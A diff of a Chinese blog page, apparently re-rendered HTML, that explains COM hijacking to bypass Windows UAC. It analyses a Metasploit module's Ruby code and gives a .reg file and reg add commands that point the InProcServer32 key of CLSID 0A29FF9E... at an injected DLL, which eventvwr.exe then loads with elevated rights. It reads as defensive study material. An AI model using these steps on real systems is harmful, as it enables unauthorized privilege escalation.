@@ -138,15 +138,15 @@
 <p>回收站的CLISD是：<code>::{645FF040-5081-101B-9F08-00AA002F954E}</code></p>
 <h3 id="clsid是如何创建的">CLSID是如何创建的</h3>
 <p>CLSID结构体：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_GUID</span> {  
-	DWORD Data1; <span style="color:#75715e">// 随机数  
-</span><span style="color:#75715e"></span>	WORD Data2; <span style="color:#75715e">// 和时间相关  
-</span><span style="color:#75715e"></span>	WORD Data3; <span style="color:#75715e">// 和时间相关  
-</span><span style="color:#75715e"></span>	BYTE Data4[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// 和网卡MAC相关 
-</span><span style="color:#75715e"></span>	} GUID;  
-	<span style="color:#66d9ef">typedef</span> GUID CLSID;  <span style="color:#75715e">// 组件ID 
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">typedef</span> GUID IID;    <span style="color:#75715e">// 接口ID
-</span></code></pre></div><p>通过操作系统提供的结构体与API来创建CLSID，保障唯一性。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_GUID</span> {  
+</span></span><span style="display:flex;"><span>	DWORD Data1; <span style="color:#75715e">// 随机数  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WORD Data2; <span style="color:#75715e">// 和时间相关  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WORD Data3; <span style="color:#75715e">// 和时间相关  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	BYTE Data4[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// 和网卡MAC相关 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	} GUID;  
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">typedef</span> GUID CLSID;  <span style="color:#75715e">// 组件ID 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">typedef</span> GUID IID;    <span style="color:#75715e">// 接口ID
+</span></span></span></code></pre></div><p>通过操作系统提供的结构体与API来创建CLSID，保障唯一性。</p>
 <h3 id="clsid-在注册表中的表现形式">CLSID 在注册表中的表现形式</h3>
 <p>常见CLSID Key：</p>
 <table>
@@ -198,53 +198,53 @@
 <p>下面我们分析一下代码：</p>
 <p>首先它会检查payload和操作系统是否支持，然后检测是否是最高权限。</p>
 <p>根据你配置的payload来生成一个DLL木马：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">payload <span style="color:#f92672">=</span> generate_payload_dll({<span style="color:#e6db74">:dll_exitprocess</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>})
-    commspec <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#39;%COMSPEC%&#39;</span>)
-    dll_name <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#34;%TEMP%</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>rand_text_alpha(<span style="color:#ae81ff">8</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.dll&#34;</span>)
-</code></pre></div><p>COM劫持配置项：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">@@hijack_points <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
-    {
-      name: <span style="color:#e6db74">&#39;Event Viewer&#39;</span>,
-      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\eventvwr.exe&#39;</span>,
-      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
-    },
-    {
-      name: <span style="color:#e6db74">&#39;Computer Managment&#39;</span>,
-      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\mmc.exe&#39;</span>,
-      <span style="color:#e6db74">cmd_args</span>: <span style="color:#e6db74">&#39;CompMgmt.msc&#39;</span>,
-      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
-    }
-  <span style="color:#f92672">]</span>
-</code></pre></div><p>该模块支持两种命令启动方式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> generate_payload_dll({<span style="color:#e6db74">:dll_exitprocess</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>})
+</span></span><span style="display:flex;"><span>    commspec <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#39;%COMSPEC%&#39;</span>)
+</span></span><span style="display:flex;"><span>    dll_name <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#34;%TEMP%</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>rand_text_alpha(<span style="color:#ae81ff">8</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.dll&#34;</span>)
+</span></span></code></pre></div><p>COM劫持配置项：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>@@hijack_points <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      name: <span style="color:#e6db74">&#39;Event Viewer&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\eventvwr.exe&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      name: <span style="color:#e6db74">&#39;Computer Managment&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\mmc.exe&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">cmd_args</span>: <span style="color:#e6db74">&#39;CompMgmt.msc&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>该模块支持两种命令启动方式：</p>
 <ul>
 <li>%WINDIR%\System32\eventvwr.exe</li>
 <li>%WINDIR%\System32\mmc.exe CompMgmt.msc</li>
 </ul>
 <p>劫持的CLSID相同：<code>0A29FF9E-7F9C-4437-8B11-F424491E3931</code></p>
 <p>创建注册表：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">target <span style="color:#f92672">=</span> @@hijack_points<span style="color:#f92672">.</span>sample
-    target_clsid <span style="color:#f92672">=</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">:class_ids</span><span style="color:#f92672">].</span>sample
-    root_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">CLSID_PATH</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span><span style="color:#e6db74">#{</span>target_clsid<span style="color:#e6db74">}</span><span style="color:#e6db74">}&#34;</span>
-    inproc_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">InProcServer32&#34;</span>
-    shell_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ShellFolder&#34;</span>
-
-    registry_createkey(root_key, registry_view)
-    registry_createkey(inproc_key, registry_view)
-    registry_createkey(shell_key, registry_view)
-
-    registry_setvaldata(inproc_key, <span style="color:#66d9ef">DEFAULT_VAL_NAME</span>, dll_path, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
-    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;ThreadingModel&#39;</span>, <span style="color:#e6db74">&#39;Apartment&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
-    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;LoadWithoutCOM&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
-    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;HideOnDesktop&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
-    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;Attributes&#39;</span>, <span style="color:#ae81ff">0xf090013d</span>, <span style="color:#e6db74">&#39;REG_DWORD&#39;</span>, registry_view)
-
-    {
-      name:     target<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>,
-      <span style="color:#e6db74">cmd_path</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_path</span><span style="color:#f92672">]</span>,
-      <span style="color:#e6db74">cmd_args</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_args</span><span style="color:#f92672">]</span>,
-      <span style="color:#e6db74">root_key</span>: root_key
-    }
-</code></pre></div><p>注册表项分别是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>target <span style="color:#f92672">=</span> @@hijack_points<span style="color:#f92672">.</span>sample
+</span></span><span style="display:flex;"><span>    target_clsid <span style="color:#f92672">=</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">:class_ids</span><span style="color:#f92672">].</span>sample
+</span></span><span style="display:flex;"><span>    root_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">CLSID_PATH</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span><span style="color:#e6db74">#{</span>target_clsid<span style="color:#e6db74">}</span><span style="color:#e6db74">}&#34;</span>
+</span></span><span style="display:flex;"><span>    inproc_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">InProcServer32&#34;</span>
+</span></span><span style="display:flex;"><span>    shell_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ShellFolder&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    registry_createkey(root_key, registry_view)
+</span></span><span style="display:flex;"><span>    registry_createkey(inproc_key, registry_view)
+</span></span><span style="display:flex;"><span>    registry_createkey(shell_key, registry_view)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    registry_setvaldata(inproc_key, <span style="color:#66d9ef">DEFAULT_VAL_NAME</span>, dll_path, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+</span></span><span style="display:flex;"><span>    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;ThreadingModel&#39;</span>, <span style="color:#e6db74">&#39;Apartment&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+</span></span><span style="display:flex;"><span>    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;LoadWithoutCOM&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+</span></span><span style="display:flex;"><span>    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;HideOnDesktop&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+</span></span><span style="display:flex;"><span>    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;Attributes&#39;</span>, <span style="color:#ae81ff">0xf090013d</span>, <span style="color:#e6db74">&#39;REG_DWORD&#39;</span>, registry_view)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      name:     target<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">cmd_path</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_path</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">cmd_args</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_args</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">root_key</span>: root_key
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>注册表项分别是：</p>
 <ul>
 <li>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32</li>
 <li>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</li>
@@ -273,20 +273,20 @@
 [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
 
 [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32]
-@=&quot;C:\\Temp\\calc.dll&quot;
-&quot;ThreadingModel&quot;=&quot;Apartment&quot;
-&quot;LoadWithoutCOM&quot;=&quot;&quot;
+@=&#34;C:\\Temp\\calc.dll&#34;
+&#34;ThreadingModel&#34;=&#34;Apartment&#34;
+&#34;LoadWithoutCOM&#34;=&#34;&#34;
 
 [HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder]
-&quot;HideOnDesktop&quot;=&quot;&quot;
-&quot;Attributes&quot;=dword:f090013d
+&#34;HideOnDesktop&#34;=&#34;&#34;
+&#34;Attributes&#34;=dword:f090013d
 </code></pre><p>中间的<code>C:\\Temp\\calc.dll</code>可以更改为你想要注入的DLL路径（支持绝对路径）。</p>
 <p>也可以使用command方式：</p>
-<pre tabindex="0"><code>reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;C:\Temp\calc.dll&quot; /f
-reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;LoadWithoutCOM&quot; /t REG_SZ /d &quot;&quot; /f
-reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /f
-reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;HideOnDesktop&quot; /t REG_SZ /d &quot;&quot; /f
-reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;Attributes&quot; /t REG_DWORD /d f090013d /f
+<pre tabindex="0"><code>reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &#34;&#34; /t REG_SZ /d &#34;C:\Temp\calc.dll&#34; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &#34;LoadWithoutCOM&#34; /t REG_SZ /d &#34;&#34; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &#34;ThreadingModel&#34; /t REG_SZ /d &#34;Apartment&#34; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &#34;HideOnDesktop&#34; /t REG_SZ /d &#34;&#34; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &#34;Attributes&#34; /t REG_DWORD /d f090013d /f
 </code></pre><h3 id="过程浅析">过程浅析</h3>
 <p><code>eventvwr.exe</code>将会寻找<code>{0A29FF9E-7F9C-4437-8B11-F424491E3931}</code>这个组件，而这个组件又需要加载<code>InProcServer32</code>指定的DLL，这个DLL的路径就是MSF上传的木马DLL。当DLL一旦加载到<code>eventvwr.exe</code>这个进程中，Windows会复制一个管理员的Access Token给这个DLL创建的进程。</p>
 <h2 id="0x03-bypass-uac的原理">0x03 Bypass UAC的原理</h2>
